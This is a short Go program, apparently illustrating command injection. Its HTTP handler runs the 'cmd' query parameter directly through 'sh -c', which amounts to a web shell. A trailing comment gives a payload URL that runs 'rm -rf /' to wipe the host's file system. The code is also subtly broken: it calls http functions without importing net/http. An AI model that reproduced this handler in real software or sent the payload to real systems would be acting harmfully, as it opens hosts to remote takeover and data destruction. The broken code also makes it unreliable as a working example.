package main

import (
	"fmt"
	"os/exec"
)

func executeCommand(cmd string) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(string(out))
}

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")
		executeCommand(cmd)
		w.Write([]byte("Command executed"))
	})
	http.ListenAndServe(":8080", nil)
}
/*
This application listens to HTTP requests on port 8080, when it receives a request, it takes the value of the "cmd" parameter from the query string, and passes it to the executeCommand function, which uses the exec.Command function to execute the command.
This payload would cause the application to execute the command rm -rf / which would delete the entire file system on the target system.
http://localhost:8080/?cmd=rm%20-rf%20%2F

*/